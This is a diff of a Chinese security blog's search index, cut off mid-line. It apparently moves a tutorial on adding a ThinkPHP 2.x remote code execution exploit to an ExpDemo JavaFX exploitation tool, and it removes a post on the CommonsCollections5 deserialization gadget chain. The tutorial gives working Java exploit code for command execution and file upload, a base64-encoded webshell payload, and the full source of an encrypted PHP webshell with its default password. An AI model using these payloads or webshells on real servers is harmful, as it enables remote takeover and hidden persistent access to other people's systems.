@@ -1,86 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ExpDemo-JavaFX工具新增漏洞编写教程</title>
-    <url>/2021/08/19/ExpDemo-JavaFX%E5%B7%A5%E5%85%B7%E6%96%B0%E5%A2%9E%E6%BC%8F%E6%B4%9E%E7%BC%96%E5%86%99%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<blockquote>
-<p>  为了提高大佬们提交PR的积极性，我也是拼了（<del>这样我就可以名正言顺的偷懒了</del>）</p>
-</blockquote>
-<h2 id="0x01-选漏洞，新建文件"><a href="#0x01-选漏洞，新建文件" class="headerlink" title="0x01 选漏洞，新建文件"></a>0x01 选漏洞，新建文件</h2><p>比如 ThinkPHP2.x的任意代码执行，使用vulhub搭建漏洞</p>
-<p><a href="https://vulhub.org/#/environments/thinkphp/2-rce/">https://vulhub.org/#/environments/thinkphp/2-rce/</a></p>
-<p>docker-compose up -d 一键搭建</p>
-<p>现在还没有ThinkPHP 相关的利用架子，界面显示也没有，只是有个按钮(我特意挑的，从图到exp编写一块教)</p>
-<h3 id="1-1-先把界面立起来"><a href="#1-1-先把界面立起来" class="headerlink" title="1.1 先把界面立起来"></a>1.1 先把界面立起来</h3><p>在<strong>src&#x2F;main&#x2F;resources</strong>下可以看到存在这么多<strong>fxml</strong>文件，直接复制一个<strong>Struts2.fxml</strong>,命名为<strong>ThinkPHP.fxml</strong> 简答方便（若有大佬对界面不满意，请自个调，我不管了）<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011617.png" alt="image-20210818201601174"></p>
-<p>然后将<strong>Struts2Controller</strong>改为<strong>ThinkPHPController</strong>, 再将85行的test.jsp 改为 test.php<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011626.png" alt="image-20210818201939529"></p>
-<p>会发现爆红，这是因为还没有<strong>ThinkPHP</strong>的逻辑控制。到这里再复制一份<strong>Struts2Controller.java</strong>改为<strong>ThinkPHPController.java</strong>即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011632.png" alt="image-20210818202113039"></p>
-<p>还有一个，你要在界面有个按钮去控制显示，在<strong>src&#x2F;main&#x2F;resources&#x2F;fxml&#x2F;Main.fxml</strong>的43行，现在已经有个<strong>ThinkPHP</strong>的按钮了，如果没有，复制一行&lt;JFXButton …&gt; ，然后将<strong>accessibleText</strong>改为你新建的**.fxml<strong>一模一样的名字，再将</strong>text**改成你想显示的名称<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011643.png" alt="image-20210818202513653"></p>
-<p>好了，现在界面好了，运行<strong>src&#x2F;main&#x2F;java&#x2F;fun&#x2F;fireline&#x2F;AppStartUp.java</strong>看下吧</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011649.png" alt="image-20210818202826787"></p>
-<p>新建一个界面简单吧</p>
-<h3 id="1-2-新建exp文件"><a href="#1-2-新建exp文件" class="headerlink" title="1.2 新建exp文件"></a>1.2 新建exp文件</h3><p>现在exp包下，还没有新建php相关的漏洞（建包主要是为了方便管理，同类型的，放一个包下）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011658.png" alt="image-20210818200412029"></p>
-<p>右键新建java文件，<strong>php.thinkphp.ThinkPHP2x</strong> ,这表示在<strong>php</strong>包下的<strong>thinkphp</strong>包下新建<strong>ThinkPHP2x.java</strong>文件，没有包则创建包（你就说细不细吧）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011704.png" alt="image-20210818200550535"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011711.png" alt="image-20210818200831938"></p>
-<p>一个EXP文件首先要实现<strong>ExploitInterface</strong>接口，看见爆红不要慌</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011717.png" alt="image-20210818200904924"></p>
-<p>鼠标悬浮上去，点击实现全部方法（我就当大佬们都不会java。怎么可能呢？！）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011728.png" alt="image-20210818200947514"></p>
-<p>框架好了，现在填EXP，具体方法作用一看就懂了,在类中再声明两个属性，一个targe、一个isVul</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011734.png" alt="image-20210818212249668"></p>
-<h3 id="1-3-代码和界面联动"><a href="#1-3-代码和界面联动" class="headerlink" title="1.3 代码和界面联动"></a>1.3 代码和界面联动</h3><p>接下来关注刚新建的<strong>ThinkPHPController.java</strong>文件，修改49行的 <strong>BASICINFO</strong> 和 <strong>STRUTS2</strong> 属性为<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011742.png" alt="image-20210818214305224"></p>
-<p>使用Ctrl + r 健,将 STRUTS2 全部替换为 ThinkPHP </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011749.png" alt="image-20210818214503421">   再添加一个属性，默认上传的shell</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SHELL</span> <span class="operator">=</span> <span class="string">&quot;&lt;?php\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;@error_reporting(0);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;session_start();\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $key=\&quot;e45e329feb5d925b\&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t$_SESSION[&#x27;k&#x27;]=$key;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tsession_write_close();\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t$post=file_get_contents(\&quot;php://input\&quot;);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tif(!extension_loaded(&#x27;openssl&#x27;))\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$t=\&quot;base64_\&quot;.\&quot;decode\&quot;;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$post=$t($post.\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\tfor($i=0;$i&lt;strlen($post);$i++) &#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    \t\t\t $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    \t\t\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\telse\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$post=openssl_decrypt($post, \&quot;AES128\&quot;, $key);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $arr=explode(&#x27;|&#x27;,$post);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $func=$arr[0];\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $params=$arr[1];\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tclass C&#123;public function __invoke($p) &#123;eval($p.\&quot;\&quot;);&#125;&#125;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    @call_user_func(new C(),$params);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;?&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>238行也修改 test.jsp 改为 test.php</p>
-<p>修改<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011758.png" alt="image-20210819011243601"></p>
-<p>这个文件修改完毕，不用动了，以后再添加thinkphp相关漏洞，只需要改<strong>BASICINFO</strong>中的描述信息(不加也可,翻遍看)，<strong>ThinkPHP</strong> 还是要改的，这个是选择漏洞列表中的东西，往后添加就行。</p>
-<p>下面去 <strong>src&#x2F;main&#x2F;java&#x2F;fun&#x2F;fireline&#x2F;tools&#x2F;Tools.java</strong>文件， 找到184行的<strong>getExploit</strong>方法。</p>
-<p>添加一个判断就行，<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011804.png" alt="image-20210818215324824"></p>
-<p>这就完了，看着图多，其实就几步，主要是为了详细</p>
-<h2 id="0x02-写EXP的具体实现"><a href="#0x02-写EXP的具体实现" class="headerlink" title="0x02 写EXP的具体实现"></a>0x02 写EXP的具体实现</h2><h3 id="2-1-checkVul-首先检测漏洞是否存在"><a href="#2-1-checkVul-首先检测漏洞是否存在" class="headerlink" title="2.1 checkVul - 首先检测漏洞是否存在"></a>2.1 checkVul - 首先检测漏洞是否存在</h3><p>Vulhub 也给了payload，方便省事，使用poc打一下,原poc是输出phpinfo,这里改成了输出一串字符<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011812.png" alt="image-20210818213036338"></p>
-<p>转成java,都是最基础的写法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测漏洞是否存在</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">checkVul</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = url;</span><br><span class="line">        <span class="comment">// 这里可以通过判断对方是否执行了 md5 计算，输出 202cb962ac59075b964b07152d234b70 来验证漏洞是否存在</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">check_payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(md5(123))&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">// post 请求，根据不同的exp，可能需要不同的请求方式，看需更改，请求方式基本都实现了，若有遗漏，请提交issues</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 src/main/java/fun/fireline/tools/HttpTool.java 工具包中的 get 方法提交</span></span><br><span class="line">            <span class="comment">// 注意 这要用 try  catch 捕获一下异常</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + check_payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            <span class="comment">// 看回显，是否存在 202cb962ac59075b964b07152d234b70</span></span><br><span class="line">            System.out.println(result);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> result.contains(<span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                <span class="built_in">this</span>.isVul = <span class="literal">true</span>;  <span class="comment">// 存在漏洞</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 输出错误日志</span></span><br><span class="line">            logger.error(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>写完测试一下</p>
-<p>运行<strong>AppStartUp.java</strong>，测试一下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011828.png" alt="image-20210818224529463"></p>
-<p>成功，而且可以设置代理，走bp，看具体流量</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011837.png" alt="image-20210818224612182"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011844.png" alt="image-20210818224629863"></p>
-<h3 id="2-2-getWebPath-获取网站根目录"><a href="#2-2-getWebPath-获取网站根目录" class="headerlink" title="2.2 getWebPath 获取网站根目录"></a>2.2 getWebPath 获取网站根目录</h3><p>这个写不写都行，这里写一下吧,thinkphp 可以通过<code>realpath(__ROOT__)</code>来获取网站的根路径，改下payload就好</p>
-<p><code>/index.php?s=/index/index/name/$&#123;@print(realpath(__ROOT__))&#125;</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的web路径，有最好，没有也无所谓</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getWebPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(realpath(__ROOT__))&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 这个payload会把 html网页也给输出，这里分割简单去除一下</span></span><br><span class="line">        <span class="keyword">return</span> result.split(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;命令执行失败&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011857.png" alt="image-20210818230017745"></p>
-<h3 id="2-3-exeCmd-执行命令"><a href="#2-3-exeCmd-执行命令" class="headerlink" title="2.3 exeCmd  执行命令"></a>2.3 exeCmd  执行命令</h3><p>这里先将 <strong>isVul</strong>方法改一下，命令执行依赖于检测，只有检测存在，才能进行命令执行</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isVul</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isVul;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Payload <code>/index.php?s=/index/index/name/$&#123;@print(system(whoami))&#125;</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 命令执行</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">exeCmd</span><span class="params">(String cmd, String encoding)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(system(payload))&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 替换payload 中的 payload 字符为要执行的命令</span></span><br><span class="line">        payload = payload.replace(<span class="string">&quot;payload&quot;</span>, cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result.split(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>测试通过</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011905.png" alt="image-20210818230642660"></p>
-<h3 id="2-4-uploadFile-上传shell"><a href="#2-4-uploadFile-上传shell" class="headerlink" title="2.4 uploadFile 上传shell"></a>2.4 uploadFile 上传shell</h3><p>Payload <code>http://127.0.0.1:8080/index.php?s=/index/index/name/$&#123;$&#123;@eval($_POST[1])&#125;&#125;</code> 这是网上的payload，上传后使用蚁剑连接即可</p>
-<p>虽然，直接使用这个payload也可用，但不方便我们自定义上传的shell马</p>
-<p>@bewhale 师傅的 thinkphp利用工具 <a href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a> 中使用这个payload来上传文件</p>
-<p><code>/index.php?s=/sd/iex/xxx/$&#123;@eval($_GET[x])&#125;&amp;x=file_put_contents(&#39;bak.php&#39;,base64_decode(&#39;PD9waHAgJGE9In4rZCgpIl4iIXsre30iO0AkYj1iYXNlNjRfZGVjb2RlKCR7JGF9WyJhIl0pO2V2YWwoIiIuJGIpOz8%2B&#39;)); </code></p>
-<p>拿来直接用</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(String fileContent, String filename, String platform)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// 对文件 base64 编码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Data</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileContent.getBytes());</span><br><span class="line">        <span class="comment">// 注意一下，需要对 base64 编码后的在进行一次url编码，</span></span><br><span class="line">        base64Data = URLEncoder.encode(base64Data, <span class="string">&quot;UTF-8&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/sd/iex/xxx/$&#123;@eval($_GET[x])&#125;&amp;x=file_put_contents(&#x27;&quot;</span> + filename + <span class="string">&quot;&#x27;,base64_decode(&#x27;&quot;</span> + base64Data + <span class="string">&quot;&#x27;));&quot;</span>;</span><br><span class="line"></span><br><span class="line">        HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上传后，访问一次上传的文件，看返回值是否为200来判断是否上传成功</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">status</span> <span class="operator">=</span> HttpTool.getStatus(<span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line">        System.out.println(status);</span><br><span class="line">        <span class="keyword">if</span>(status == <span class="number">200</span>) &#123;</span><br><span class="line">            result = <span class="string">&quot;上传成功! 路径： &quot;</span> + <span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result =  <span class="string">&quot;上传失败， 请用这个payload，蚁剑连接试一下 /index.php?s=/index/index/name/$&#123;$&#123;@eval($_POST[1])&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011913.png" alt="image-20210819011430581"></p>
-<p>打完收工</p>
-]]></content>
-      <categories>
-        <category>GitHub工具</category>
-      </categories>
-      <tags>
-        <tag>GitHub工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>GRPC 学习笔记</title>
     <url>/2022/08/11/GRPC%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>gRPC 是 Google 开源的一个远程过程调用(Remote Procedure Call) 框架，在 gRPC 中，客户端应用程序可以直接调用不同机器上的服务器应用程序上的方法，就像它是本地对象一样，更容易创建分布式应用程序和服务。默认情况下，gRPC 使用 <code>协议缓冲区 </code> 通信, 并支持以下语言:</p>
@@ -225,61 +145,83 @@
       </tags>
   </entry>
   <entry>
-    <title>Java ysoserial学习之CommonsCollections5(四)</title>
-    <url>/2021/07/01/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections5(%E5%9B%9B)/</url>
+    <title>ExpDemo-JavaFX工具新增漏洞编写教程</title>
+    <url>/2021/08/19/ExpDemo-JavaFX%E5%B7%A5%E5%85%B7%E6%96%B0%E5%A2%9E%E6%BC%8F%E6%B4%9E%E7%BC%96%E5%86%99%E6%95%99%E7%A8%8B/</url>
     <content><![CDATA[<blockquote>
-<p>  庆祝我伟大的党百年华诞🎉</p>
-<p>  向伟大的祖国敬礼(‘-‘*ゞ</p>
+<p>  为了提高大佬们提交PR的积极性，我也是拼了（<del>这样我就可以名正言顺的偷懒了</del>）</p>
 </blockquote>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上节说道在<strong>commons-collections-3.2.1.jar!&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;keyvalue&#x2F;TiedMapEntry.class</strong>类中，总共有三个函数调用了<strong>getValue</strong>函数：</p>
-<ul>
-<li><p><strong>toString</strong>    CC5   本文重点</p>
-</li>
-<li><p><strong>hashCode</strong>    CC6</p>
-</li>
-<li><p><strong>equals</strong>      CC7</p>
-</li>
-</ul>
-<p>本文CommonsCollections6利用链的限制条件：</p>
-<p>​	JDK版本：暂无限制、 CommonsCollections 3.1 - 3.2.1</p>
-<p>实验环境:</p>
-<p>​	JDK 1.8.0_261 、Commons-Collections 3.2.1 </p>
-<h2 id="0x01-利用链"><a href="#0x01-利用链" class="headerlink" title="0x01 利用链"></a>0x01 利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x01-选漏洞，新建文件"><a href="#0x01-选漏洞，新建文件" class="headerlink" title="0x01 选漏洞，新建文件"></a>0x01 选漏洞，新建文件</h2><p>比如 ThinkPHP2.x的任意代码执行，使用vulhub搭建漏洞</p>
+<p><a href="https://vulhub.org/#/environments/thinkphp/2-rce/">https://vulhub.org/#/environments/thinkphp/2-rce/</a></p>
+<p>docker-compose up -d 一键搭建</p>
+<p>现在还没有ThinkPHP 相关的利用架子，界面显示也没有，只是有个按钮(我特意挑的，从图到exp编写一块教)</p>
+<h3 id="1-1-先把界面立起来"><a href="#1-1-先把界面立起来" class="headerlink" title="1.1 先把界面立起来"></a>1.1 先把界面立起来</h3><p>在<strong>src&#x2F;main&#x2F;resources</strong>下可以看到存在这么多<strong>fxml</strong>文件，直接复制一个<strong>Struts2.fxml</strong>,命名为<strong>ThinkPHP.fxml</strong> 简答方便（若有大佬对界面不满意，请自个调，我不管了）<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011617.png" alt="image-20210818201601174"></p>
+<p>然后将<strong>Struts2Controller</strong>改为<strong>ThinkPHPController</strong>, 再将85行的test.jsp 改为 test.php<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011626.png" alt="image-20210818201939529"></p>
+<p>会发现爆红，这是因为还没有<strong>ThinkPHP</strong>的逻辑控制。到这里再复制一份<strong>Struts2Controller.java</strong>改为<strong>ThinkPHPController.java</strong>即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011632.png" alt="image-20210818202113039"></p>
+<p>还有一个，你要在界面有个按钮去控制显示，在<strong>src&#x2F;main&#x2F;resources&#x2F;fxml&#x2F;Main.fxml</strong>的43行，现在已经有个<strong>ThinkPHP</strong>的按钮了，如果没有，复制一行&lt;JFXButton …&gt; ，然后将<strong>accessibleText</strong>改为你新建的**.fxml<strong>一模一样的名字，再将</strong>text**改成你想显示的名称<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011643.png" alt="image-20210818202513653"></p>
+<p>好了，现在界面好了，运行<strong>src&#x2F;main&#x2F;java&#x2F;fun&#x2F;fireline&#x2F;AppStartUp.java</strong>看下吧</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011649.png" alt="image-20210818202826787"></p>
+<p>新建一个界面简单吧</p>
+<h3 id="1-2-新建exp文件"><a href="#1-2-新建exp文件" class="headerlink" title="1.2 新建exp文件"></a>1.2 新建exp文件</h3><p>现在exp包下，还没有新建php相关的漏洞（建包主要是为了方便管理，同类型的，放一个包下）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011658.png" alt="image-20210818200412029"></p>
+<p>右键新建java文件，<strong>php.thinkphp.ThinkPHP2x</strong> ,这表示在<strong>php</strong>包下的<strong>thinkphp</strong>包下新建<strong>ThinkPHP2x.java</strong>文件，没有包则创建包（你就说细不细吧）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011704.png" alt="image-20210818200550535"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011711.png" alt="image-20210818200831938"></p>
+<p>一个EXP文件首先要实现<strong>ExploitInterface</strong>接口，看见爆红不要慌</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011717.png" alt="image-20210818200904924"></p>
+<p>鼠标悬浮上去，点击实现全部方法（我就当大佬们都不会java。怎么可能呢？！）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011728.png" alt="image-20210818200947514"></p>
+<p>框架好了，现在填EXP，具体方法作用一看就懂了,在类中再声明两个属性，一个targe、一个isVul</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011734.png" alt="image-20210818212249668"></p>
+<h3 id="1-3-代码和界面联动"><a href="#1-3-代码和界面联动" class="headerlink" title="1.3 代码和界面联动"></a>1.3 代码和界面联动</h3><p>接下来关注刚新建的<strong>ThinkPHPController.java</strong>文件，修改49行的 <strong>BASICINFO</strong> 和 <strong>STRUTS2</strong> 属性为<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011742.png" alt="image-20210818214305224"></p>
+<p>使用Ctrl + r 健,将 STRUTS2 全部替换为 ThinkPHP </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011749.png" alt="image-20210818214503421">   再添加一个属性，默认上传的shell</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SHELL</span> <span class="operator">=</span> <span class="string">&quot;&lt;?php\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;@error_reporting(0);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;session_start();\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;    $key=\&quot;e45e329feb5d925b\&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t$_SESSION[&#x27;k&#x27;]=$key;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tsession_write_close();\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t$post=file_get_contents(\&quot;php://input\&quot;);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\tif(!extension_loaded(&#x27;openssl&#x27;))\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t&#123;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$t=\&quot;base64_\&quot;.\&quot;decode\&quot;;\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t$post=$t($post.\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">         <span class="string">&quot;\t\t\n&quot;</span> +</span><br><span 